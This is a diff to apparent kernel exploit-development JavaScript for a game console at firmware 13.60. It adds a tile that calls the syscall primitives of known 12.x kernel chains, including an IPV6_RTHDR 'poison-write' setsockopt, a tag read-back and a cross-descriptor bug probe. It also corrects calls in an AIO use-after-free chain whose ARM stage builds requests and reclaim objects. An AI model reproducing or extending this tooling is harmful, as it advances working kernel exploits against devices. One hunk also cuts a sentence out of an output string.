@@ -749,6 +749,150 @@
         return { ok: ok > 0, summary: ok + "/" + total };
     }
 
+    /* T2c -- the P2JB / poops KERNEL-BUG syscall surface, called for real. Both patched
+     * 12.00-12.70 chains drive the SAME primitives, and every number is a proven 13.60
+     * stub; nothing here writes kernel memory:
+     *   - socketpair(0x035) / socket(0x061): allocate the objects the bugs operate on
+     *   - setsockopt(IPPROTO_IPV6=41, IPV6_RTHDR=51, tag, 0x38) (0x069): THE tag/poison
+     *     write used by both chains; IPV6_FL_AUDIT=0x6d is the 13.x validator. PASS = the
+     *     validator accepted the pair (that validator is what "patched" means).
+     *   - getsockopt(IPV6_RTHDR) (0x06A): the READ side; PASS = echoes our own tag.
+     *   - getrlimit(0x0C2): the helper both chains use to read fudge limits.
+     * Closeable consequences only: every fd and every kq closes again. The kernel-memory
+     * stages of those bugs (getsockopt(victim) rewriting ip6po_rthdr pointers) are NOT
+     * reproducible on 13.60 if the validator refuses -- and if it accepts, THAT is the
+     * headline result. Either way this tile measures, it never assumes. */
+    function pKbugs() {
+        try {
+            var AF_INET6 = 28n, SOCK_STREAM = 1n, IPPROTO_IPV6 = 41n, IPV6_RTHDR = 51n,
+                IPV6_FL_AUDIT = 0x6dn, SOL_SOCKET = 0xffffn, SO_REUSEADDR = 4n;
+            var NPAIR = 2;
+            var ipv6s = [], pairs = [], kq = -1;
+            var clean = function () {
+                for (var i = 0; i < ipv6s.length; i++) S("close(ipv6)", 0x006, [BigInt(ipv6s[i])]);
+                for (var j = 0; j < pairs.length; j++) {
+                    S("close(sp r)", 0x006, [BigInt(pairs[j][0])]);
+                    S("close(sp w)", 0x006, [BigInt(pairs[j][1])]);
+                }
+                if (kq >= 0) S("close(kq)", 0x006, [BigInt(kq)]);
+            };
+
+            /* -- allocations -- */
+            var so = S("socket(AF_INET6,SOCK_STREAM)", 0x061, [AF_INET6, SOCK_STREAM, 0n]);
+            var socketOk = so.ret !== undefined && B(so.ret) >= 0n && B(so.ret) < 0x100n;
+            if (!socketOk) {
+                out("T2c-VERDICT", "socket(AF_INET6) refused (" + (so.errName || (so.ret === undefined ? so.threw : hex(so.ret)))
+                    + ") -- the IPV6 socket layer the two chains drive is not reachable; nothing else in this tile can run", "warn");
+                nres("no AF_INET6 socket", "T2c");
+                return { ok: true, summary: "no socket" };
+            }
+            ipv6s.push(Number(B(so.ret)));
+            out("T2c-socket", "fd=" + ipv6s[0] + " -- the object both 12.x kernel chains operate on", "ok");
+
+            for (var pi = 0; pi < NPAIR; pi++) {
+                var sf = zeros(malloc(0x10), 0x10);
+                var spr = S("socketpair#" + pi, 0x035, [1n, 1n, 0n, sf]);
+                if (spr.ret !== undefined && B(spr.ret) === 0n) {
+                    var pr = new Int32Array(window.read_buffer(sf, 8).buffer, 0, 2);
+                    pairs.push([pr[0], pr[1]]);
+                    out("T2c-socketpair", "pair#" + pi + " r=" + pr[0] + " w=" + pr[1], "ok");
+                } else {
+                    out("T2c-socketpair", "pair#" + pi + " refused: " + (spr.errName || hex(spr.ret)), "dim");
+                }
+            }
+            var kqr = S("kqueue", 0x16A, []);
+            if (kqr.ret !== undefined && B(kqr.ret) >= 0n && B(kqr.ret) < 0x100n) kq = Number(B(kqr.ret));
+
+            /* -- setsockopt(IPV6_RTHDR) with a 0x38 tag: PASS = the 13.x validator ACCEPTED it -- */
+            var tag = zeros(malloc(0x40), 0x40);
+            var tbytes = new Uint8Array(0x38);
+            tbytes[0] = 0x38;                            /* ip6po_rthdr wants a valid cmhdr length */
+            for (var ti = 1; ti < 8; ti++) tbytes[ti] = 0xC3;      /* tag 0xC3C3... first 8 bytes */
+            window.write_buffer(tag, tbytes);
+            var ss = S("setsockopt(IPV6_RTHDR,tag,0x38)", 0x069, [B(so.ret), IPPROTO_IPV6, IPV6_RTHDR, tag, 0x38n]);
+            var ssOk = ss.ret !== undefined && B(ss.ret) === 0n;
+            out("T2c-setsockopt", "setsockopt(IPV6_RTHDR) -> " + (ss.ret === undefined ? ss.threw : hex(ss.ret))
+                + (ss.errName ? " (" + ss.errName + ")" : "")
+                + (ssOk ? " -- validator ACCEPTED the pair: the poison-write primitive of both 12.x chains still goes through"
+                        : " -- validator REFUSED the pair (this refusal IS the 13.x patch in action)"), ssOk ? "ok" : "dim");
+
+            /* -- the differential: IPV6_FL_AUDIT validator -- */
+            var audit = S("setsockopt(IPV6_FL_AUDIT)", 0x069, [B(so.ret), IPPROTO_IPV6, IPV6_FL_AUDIT, tag, 0x38n], true);
+            out("T2c-audit", "IPV6_FL_AUDIT(0x6d) -> " + (audit.ret === undefined ? audit.threw : hex(audit.ret))
+                + (audit.errName ? " (" + audit.errName + ")" : "")
+                + " -- the 13.x rthdr validator; its behavior is what distinguishes patched from exploitable", "dim");
+
+            /* -- getsockopt READ-BACK: does our own tag echo? -- */
+            var rb = zeros(malloc(0x40), 0x40);
+            var rblen = zeros(malloc(4), 4);
+            window.write_buffer(rblen, new Uint8Array([0x40, 0, 0, 0]));
+            var gs = S("getsockopt(IPV6_RTHDR)", 0x06A, [B(so.ret), IPPROTO_IPV6, IPV6_RTHDR, rb, rblen]);
+            var gsOk = gs.ret !== undefined && B(gs.ret) === 0n;
+            var echoed = false;
+            if (gsOk) {
+                var back = new Uint8Array(window.read_buffer(rb, 8));
+                echoed = back[1] === 0xC3 && back[2] === 0xC3 && back[3] === 0xC3;
+            }
+            out("T2c-getsockopt", "getsockopt(IPV6_RTHDR) -> " + (gs.ret === undefined ? gs.threw : hex(gs.ret))
+                + (gs.errName ? " (" + gs.errName + ")" : "")
+                + (gsOk ? (echoed ? " -- our own tag ECHOED: kernel round-trips the rthdr option (read side of both chains works)"
+                                  : " -- ok, but the buffer did not echo our tag: the option is kernel-generated, not stored verbatim")
+                       : " -- refused; the read side is gated too"), gsOk ? "ok" : "dim");
+
+            /* -- getsockopt(victim) ACROSS descriptors: the actual bug shape. On 12.x the
+             *    master/victim pair let this cross and rewrite the victim's rthdr POINTER.
+             *    Here it must fail cleanly (EINVAL/ENOENT) -- if it ever returns 0, that is
+             *    the headline. Reads only; still safe. -- */
+            var xbuf = zeros(malloc(0x40), 0x40);
+            var xlen = zeros(malloc(4), 4);
+            window.write_buffer(xlen, new Uint8Array([0x40, 0, 0, 0]));
+            var xs = pairs.length > 0
+                ? S("getsockopt(victim) -- THE 12.x BUG SHAPE", 0x06A, [BigInt(pairs[0][0]), IPPROTO_IPV6, IPV6_RTHDR, xbuf, xlen], true)
+                : { ret: undefined, threw: "no pair" };
+            var xOk = xs.ret !== undefined && B(xs.ret) === 0n;
+            out("T2c-cross", "getsockopt(victim-pipe-fd, IPV6_RTHDR) -> " + (xs.ret === undefined ? xs.threw : hex(xs.ret))
+                + (xs.errName ? " (" + xs.errName + ")" : "")
+                + (xOk ? " -- !! RETURNED 0 ON A NON-SOCKET: the 12.x bug shape is ALIVE on 13.60 --"
+                       : " -- refused cleanly (a non-socket fd is not an IPV6 object): the cross-descriptor shape is dead here"), xOk ? "ok" : "dim");
+
+            /* -- getrlimit: the helper both chains use -- */
+            var rl = zeros(malloc(0x10), 0x10);
+            var gr = S("getrlimit(RLIMIT_NOFILE)", 0x0C2, [8n, rl]);
+            var grOk = gr.ret !== undefined && B(gr.ret) === 0n;
+            var cur = grOk ? B(window.read64(rl)) & 0xFFFFFFFFn : 0n;
+            out("T2c-getrlimit", "getrlimit(NOFILE) -> " + (gr.ret === undefined ? gr.threw : hex(gr.ret))
+                + (grOk ? " (cur=" + cur + ") -- the helper both chains use answers"
+                       : (gr.errName ? " (" + gr.errName + ")" : "")), grOk ? "ok" : "warn");
+
+            /* -- verdict -- */
+            var parts = [];
+            if (ssOk) parts.push("RTHDR-VALIDATOR-ACCEPTED");
+            if (gsOk && echoed) parts.push("TAG-ECHO");
+            if (xOk) parts.push("CROSS-FD-RETURNED-0 (!!)");
+            if (grOk) parts.push("getrlimit ok");
+            var headline = (xOk || (ssOk && gsOk && echoed))
+                ? " THE 12.x CHAIN PRIMITIVES ARE ALIVE ON " + FW + " -- worth a deeper look before Bagagwa."
+                : (ssOk ? " the poison-write socket option is ACCEPTED but no 12.x bug shape reproduced: the validator passes benign pairs and still gates the bug. Both chains stay PATCHED in effect."
+                        : " the 12.x surface answers but every bug shape is refused: PATCHED as expected. Every number called here is real, measured, and closed again.");
+            out("T2c-VERDICT", "P2JB/poops surface called for real on " + FW + ": " + parts.join(", ") + "." + headline
+                + " Nothing wrote kernel memory: sockets/pairs/kq all closed again.", "ok");
+            notify("T2c: " + parts.join(",").slice(0, 46) + " | " + FW);
+            chip(elVerdict, "ok", "12.x surface " + parts.length + "/4");
+            nres(parts.join(",").slice(0, 40) || "all refused", "T2c");
+            clean();
+            return { ok: true, summary: parts.length + "/4 checks" };
+        } catch (e) {
+            out("T2c-VERDICT", "THREW " + String((e && e.message) || e).slice(0, 90), "err");
+            nres("threw", "T2c");
+            return { ok: false, summary: "threw" };
+        }
+    }
+
+    /* T3b-fix, part 1: pLive's WAIT now reads states from a real buffer (arg3) so the
+     * call matches the MEASURED ABI model (states is dereferenced whenever num>=1).
+     * Part 2 (below): the fd labels in pLive's cleanup were INVERTED -- verified against
+     * T2's pipe2 semantics (rd[0] = read end). */
+
     /* T3 -- the AIO family, reachability ONLY. This is the gate the whole Bagagwa chain
      * hangs on.
      *
@@ -866,8 +1010,12 @@
             var id0 = window.read64(ids), id1 = window.read64(ids + 8n);
             out("T3b-submit", "ok -- 2 pending MULTI_READ requests, ids=[" + hex(B(id0)) + ", " + hex(B(id1)) + "]", "ok");
 
-            /* THE wait -- one id, num=1. Links at most one node onto one waiter list. */
-            var w = S("aio_multi_wait(ids[0], num=1)", 0x297, [ids, 1n, 0n, 0n, 0n]);
+            /* THE wait -- one id, num=1, and a REAL states buffer: the measured ABI model
+             * says states (arg3) is dereferenced whenever num>=1, so passing 0 here would
+             * tell us about EFAULT, not about the wait itself. Zero-filled states are safe:
+             * a wait on an incomplete request returns before any state is written. */
+            var stbuf = zeros(malloc(0x40), 0x40);          /* room for one 0x38 io_state */
+            var w = S("aio_multi_wait(ids[0], num=1)", 0x297, [ids, 1n, stbuf, 0n, 0n]);
             out("T3b-wait", "aio_multi_wait(ids, num=1) -> " + (w.ret === undefined ? w.threw : hex(w.ret))
                 + (w.errName ? " (" + w.errName + ")" : "")
                 + " -- num=1 can never reproduce the UAF (that needs num>=2 in ONE call)", "dim");
@@ -880,15 +1028,14 @@
             /* Cleanup: cancel then delete with the SAME pointer and num=1. */
             var c = S("aio_multi_cancel(ids,1)", 0x29A, [ids, 1n, 0n], true);
             var d = S("aio_multi_delete(ids,1)", 0x296, [ids, 1n, 0n], true);
-            S("close w", 0x006, [BigInt(sfd[0])]);
-            S("close r", 0x006, [BigInt(sfd[1])]);
+            S("close w", 0x006, [BigInt(sfd[1])]);   /* fd labels verified against T2's pipe2: sfd[0] is the read end */
+            S("close r", 0x006, [BigInt(sfd[0])]);
 
             out("T3b-VERDICT", "LIVE-REQUEST REACHABILITY MEASURED on " + FW + ": socketpair ok, submit ok (2 pending reads), "
                 + "multi_wait(num=1) answered " + (w.ret === undefined ? w.threw : hex(w.ret)) + (w.errName ? " (" + w.errName + ")" : "")
                 + ", cancel=" + (c.ret === undefined ? c.threw : hex(c.ret)) + (c.errName ? " (" + c.errName + ")" : "")
                 + ", delete=" + (d.ret === undefined ? d.threw : hex(d.ret)) + (d.errName ? " (" + d.errName + ")" : "")
                 + ". This settles what the armed call will see: whether ids from submit are raw handles "
-                + "(wait ESRCH-free) or need an indirection, and which of mode/timeout positions the "
                 + "kernel accepts. What it can NEVER do is arm the UAF -- every call here had num<=1, "
                 + "and the corruption needs num>=2 in ONE call. That step stays behind your explicit go.", "ok");
             notify("bagagwa T3b live request: wait=" + (w.ret === undefined ? "threw" : hex(w.ret)) + " on " + FW);
@@ -1318,10 +1465,10 @@
                         + (pp.errName || (pp.ret === undefined ? pp.threw : hex(pp.ret))) + ")", "err");
                     nres("no live-request source", "ARM");
                     return { ok: false, summary: "no source" };
-                }
                 var pr = new Int32Array(window.read_buffer(pfds, 8).buffer, 0, 2);
                 rfd = pr[0]; wfd = pr[1];
                 out("ARM-src", "pipe2 fallback rfd=" + rfd + " wfd=" + wfd, "warn");
+            }
             }
 
             /* -- build the two 0x28 request structs with the READ fd at +0x20 -- */
@@ -1415,7 +1562,8 @@
             var w60now = new Uint8Array(window.read_buffer(witness60, 0x60));
             var witnessHit = false; for (var wi2 = 0; wi2 < 0x60; wi2++) if (w60now[wi2] !== w60snap[wi2]) { witnessHit = true; break; }
 
-            /* -- cleanup: cancel+delete the requests, close the pair; reclaim osems stay alive -- */
+            /* -- cleanup: cancel+delete the requests, close the pair; reclaim osems stay alive.
+             *    fd labels verified against T2's pipe2 semantics: rd[0] is the READ end. -- */
             S("aio_multi_cancel(ids,1)", 0x29A, [ids, 1n, 0n], true);
             S("aio_multi_delete(ids,1)", 0x296, [ids, 1n, 0n], true);
             S("close r", 0x006, [BigInt(rfd)]);
@@ -1562,6 +1710,13 @@
             id: "resources", label: "Descriptors", run: pResources,
             desc: "kqueue and pipe2 -- the two fd-returning calls the reclaim paths need. "
                 + "Both are closed again.",
+        },
+        {
+            id: "kbugs", label: "P2JB/poops calls", run: pKbugs,
+            desc: "Read-only. Calls the REAL syscalls the patched 12.00-12.70 kernel chains "
+                + "drive: socket(AF_INET6), setsockopt(IPV6_RTHDR) tag, getsockopt read-back "
+                + "and the cross-descriptor bug shape, getrlimit. Every fd closes again; "
+                + "nothing writes kernel memory.",
         },
         {
             id: "aio", label: "AIO reach", run: pAio,
